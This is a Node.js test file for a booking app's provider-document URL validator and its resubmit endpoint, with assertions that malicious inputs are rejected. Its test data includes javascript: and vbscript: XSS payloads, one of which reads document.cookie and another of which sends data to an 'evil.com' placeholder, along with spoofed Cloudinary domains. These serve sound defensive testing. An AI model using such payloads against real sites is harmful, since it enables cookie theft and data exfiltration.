const assert = require('node:assert/strict');
const test = require('node:test');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const { env } = require('../src/config/env.js');
const { isOwnedProviderDocument, ALLOWED_DOC_TYPES } = require('../src/shared/validators.js');
const { validateResubmitPayload } = require('../src/modules/provider-verification/providerVerification.validation.js');
const { dispatch } = require('../test-helpers/dispatch.js');
const User = require('../src/modules/users/user.model.js');
const ProviderProfile = require('../src/modules/providers/provider.model.js');
const app = require('../src/app.js');

const USER_A_ID = '64b1f2a3c4d5e6f7a8b9c0d1';
const USER_B_ID = '64b1f2a3c4d5e6f7a8b9c0d2';

test('V-09: isOwnedProviderDocument validates scheme, host, and user-scoped path', () => {
  const validUrlA = `https://res.cloudinary.com/demo/image/upload/v123456/home-service-booking/provider-documents/${USER_A_ID}/id_card.png`;
  const validUrlB = `https://res.cloudinary.com/demo/image/upload/v123456/home-service-booking/provider-documents/${USER_B_ID}/cert.jpg`;

  // 1. Valid URLs for correct owner
  assert.equal(isOwnedProviderDocument(validUrlA, USER_A_ID), true);
  assert.equal(isOwnedProviderDocument(validUrlB, USER_B_ID), true);
  assert.equal(isOwnedProviderDocument(validUrlA, new mongoose.Types.ObjectId(USER_A_ID)), true);

  // 2. Cross-user document access rejected
  assert.equal(isOwnedProviderDocument(validUrlA, USER_B_ID), false);
  assert.equal(isOwnedProviderDocument(validUrlB, USER_A_ID), false);

  // 3. Dangerous script schemes rejected
  assert.equal(isOwnedProviderDocument('javascript:alert(1)', USER_A_ID), false);
  assert.equal(isOwnedProviderDocument(`javascript:fetch("//evil.com/?doc=${USER_A_ID}")`, USER_A_ID), false);
  assert.equal(isOwnedProviderDocument('vbscript:msgbox(1)', USER_A_ID), false);
  assert.equal(isOwnedProviderDocument('JAVASCRIPT:alert(1)', USER_A_ID), false);

  // 4. Insecure HTTP rejected
  assert.equal(
    isOwnedProviderDocument(`http://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`, USER_A_ID),
    false
  );

  // 5. Foreign domains and domain spoofing rejected
  assert.equal(
    isOwnedProviderDocument(`https://evil.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`, USER_A_ID),
    false
  );
  assert.equal(
    isOwnedProviderDocument(`https://res.cloudinary.com.evil.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`, USER_A_ID),
    false
  );

  // 6. Non-provider-document folder rejected
  assert.equal(
    isOwnedProviderDocument(`https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/service-requests/${USER_A_ID}/photo.png`, USER_A_ID),
    false
  );

  // 7. Invalid user IDs and missing inputs rejected
  assert.equal(isOwnedProviderDocument(validUrlA, null), false);
  assert.equal(isOwnedProviderDocument(validUrlA, undefined), false);
  assert.equal(isOwnedProviderDocument(validUrlA, ''), false);
  assert.equal(isOwnedProviderDocument(null, USER_A_ID), false);
  assert.equal(isOwnedProviderDocument(12345, USER_A_ID), false);
  assert.equal(isOwnedProviderDocument('a'.repeat(2049), USER_A_ID), false);
});

test('V-09: validateResubmitPayload enforces ownership and valid docType enum', () => {
  const user = { _id: USER_A_ID, role: 'PROVIDER' };

  // 1. Rejects dangerous javascript: URL
  const reqJs = {
    user,
    body: {
      documents: [{ docType: 'ID_CARD', fileUrl: 'javascript:alert(1)' }],
    },
  };
  validateResubmitPayload(reqJs, {}, (err) => {
    assert.ok(err, 'Expected error for javascript: URL');
    assert.equal(err.statusCode, 400);
    assert.match(err.message, /URL tài liệu thứ 1 không hợp lệ/);
  });

  // 2. Rejects HTTP URL
  const reqHttp = {
    user,
    body: {
      documents: [
        {
          docType: 'ID_CARD',
          fileUrl: `http://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`,
        },
      ],
    },
  };
  validateResubmitPayload(reqHttp, {}, (err) => {
    assert.ok(err, 'Expected error for http:// URL');
    assert.equal(err.statusCode, 400);
  });

  // 3. Rejects foreign domain
  const reqForeign = {
    user,
    body: {
      documents: [
        {
          docType: 'ID_CARD',
          fileUrl: `https://attacker.site/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`,
        },
      ],
    },
  };
  validateResubmitPayload(reqForeign, {}, (err) => {
    assert.ok(err, 'Expected error for foreign domain URL');
    assert.equal(err.statusCode, 400);
  });

  // 4. Rejects another user's Cloudinary document
  const reqOtherUser = {
    user,
    body: {
      documents: [
        {
          docType: 'ID_CARD',
          fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_B_ID}/id.png`,
        },
      ],
    },
  };
  validateResubmitPayload(reqOtherUser, {}, (err) => {
    assert.ok(err, "Expected error for another user's document URL");
    assert.equal(err.statusCode, 400);
  });

  // 5. Rejects invalid docType outside ALLOWED_DOC_TYPES enum
  const reqBadDocType = {
    user,
    body: {
      documents: [
        {
          docType: 'HACKED_TYPE',
          fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`,
        },
      ],
    },
  };
  validateResubmitPayload(reqBadDocType, {}, (err) => {
    assert.ok(err, 'Expected error for invalid docType');
    assert.equal(err.statusCode, 400);
    assert.match(err.message, /docType của tài liệu thứ 1 không hợp lệ/);
  });

  // 6. Accepts all valid docTypes for authenticated provider
  for (const docType of ALLOWED_DOC_TYPES) {
    const reqValid = {
      user,
      body: {
        documents: [
          {
            docType,
            fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/doc.png`,
          },
        ],
      },
    };
    validateResubmitPayload(reqValid, {}, (err) => {
      assert.ifError(err);
      assert.equal(reqValid.validatedResubmit.documents[0].docType, docType);
    });
  }

  // 7. Rejects excessive documents count (>10)
  const reqTooMany = {
    user,
    body: {
      documents: Array.from({ length: 11 }, (_, i) => ({
        docType: 'OTHER',
        fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/doc_${i}.png`,
      })),
    },
  };
  validateResubmitPayload(reqTooMany, {}, (err) => {
    assert.ok(err, 'Expected error for excessive documents count');
    assert.equal(err.statusCode, 400);
    assert.match(err.message, /không được vượt quá 10 tài liệu/);
  });

  // 8. Rejects when unauthenticated user submits documents
  const reqNoUser = {
    body: {
      documents: [
        {
          docType: 'ID_CARD',
          fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/doc.png`,
        },
      ],
    },
  };
  validateResubmitPayload(reqNoUser, {}, (err) => {
    assert.ok(err, 'Expected 401 when unauthenticated');
    assert.equal(err.statusCode, 401);
  });
});

test('V-09: POST /api/provider-verification/my/resubmit rejects malicious inputs and accepts owned documents', async () => {
  const providerId = new mongoose.Types.ObjectId(USER_A_ID);
  const otherUserId = new mongoose.Types.ObjectId(USER_B_ID);
  const token = jwt.sign({ sub: providerId.toString(), role: 'PROVIDER' }, env.jwtSecret, { expiresIn: '1h' });

  const originalUserFindById = User.findById;
  const originalProfileFindOne = ProviderProfile.findOne;

  const mockProfileDoc = {
    _id: new mongoose.Types.ObjectId(),
    user: providerId,
    businessName: 'Thợ Điện Nước',
    description: 'Chuyên sửa chữa điện nước',
    verificationStatus: 'UNDER_REVIEW',
    additionalInfoRequested: true,
    documents: [],
    verificationLogs: [],
    save: async function () { return this; },
  };

  User.findById = (id) => ({
    select: async () => {
      if (String(id) === USER_A_ID) {
        return { _id: providerId, role: 'PROVIDER', status: 'ACTIVE', fullName: 'Thợ A', email: 'thoa@test.vn' };
      }
      return null;
    },
  });

  const chain = {
    populate() { return chain; },
    lean: async () => ({
      ...mockProfileDoc,
      user: { _id: providerId, fullName: 'Thợ A', email: 'thoa@test.vn' },
    }),
    then(resolve) { return resolve(mockProfileDoc); },
  };
  ProviderProfile.findOne = () => chain;

  try {
    // 1. Attempt resubmit with javascript: URL -> 400
    const resJs = await dispatch(app, {
      method: 'POST',
      url: '/api/provider-verification/my/resubmit',
      headers: { Authorization: `Bearer ${token}` },
      body: {
        documents: [{ docType: 'ID_CARD', fileUrl: 'javascript:alert(document.cookie)' }],
      },
    });
    assert.equal(resJs.status, 400);

    // 2. Attempt resubmit with HTTP URL -> 400
    const resHttp = await dispatch(app, {
      method: 'POST',
      url: '/api/provider-verification/my/resubmit',
      headers: { Authorization: `Bearer ${token}` },
      body: {
        documents: [
          {
            docType: 'ID_CARD',
            fileUrl: `http://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`,
          },
        ],
      },
    });
    assert.equal(resHttp.status, 400);

    // 3. Attempt resubmit with foreign domain -> 400
    const resEvil = await dispatch(app, {
      method: 'POST',
      url: '/api/provider-verification/my/resubmit',
      headers: { Authorization: `Bearer ${token}` },
      body: {
        documents: [
          {
            docType: 'ID_CARD',
            fileUrl: `https://evil.phishing.site/home-service-booking/provider-documents/${USER_A_ID}/id.png`,
          },
        ],
      },
    });
    assert.equal(resEvil.status, 400);

    // 4. Attempt resubmit with other user's document URL -> 400
    const resOther = await dispatch(app, {
      method: 'POST',
      url: '/api/provider-verification/my/resubmit',
      headers: { Authorization: `Bearer ${token}` },
      body: {
        documents: [
          {
            docType: 'ID_CARD',
            fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${otherUserId.toString()}/id.png`,
          },
        ],
      },
    });
    assert.equal(resOther.status, 400);

    // 5. Attempt resubmit with invalid docType -> 400
    const resDocType = await dispatch(app, {
      method: 'POST',
      url: '/api/provider-verification/my/resubmit',
      headers: { Authorization: `Bearer ${token}` },
      body: {
        documents: [
          {
            docType: 'INVALID_TYPE',
            fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/id.png`,
          },
        ],
      },
    });
    assert.equal(resDocType.status, 400);

    // 6. Resubmit with valid own document URL and valid docType -> 200
    const resSuccess = await dispatch(app, {
      method: 'POST',
      url: '/api/provider-verification/my/resubmit',
      headers: { Authorization: `Bearer ${token}` },
      body: {
        businessName: 'Thợ Điện Nước Pro',
        documents: [
          {
            docType: 'ID_CARD',
            fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/cccd_front.png`,
          },
          {
            docType: 'CERTIFICATE',
            fileUrl: `https://res.cloudinary.com/demo/image/upload/v1/home-service-booking/provider-documents/${USER_A_ID}/chung_chi.png`,
          },
        ],
        note: 'Em đã cập nhật CCCD rõ nét và chứng chỉ',
      },
    });
    assert.equal(resSuccess.status, 200);
    const bodySuccess = await resSuccess.json();
    assert.equal(bodySuccess.success, true);
    assert.match(bodySuccess.message, /Đã gửi lại hồ sơ thành công/);
  } finally {
    User.findById = originalUserFindById;
    ProviderProfile.findOne = originalProfileFindOne;
  }
});
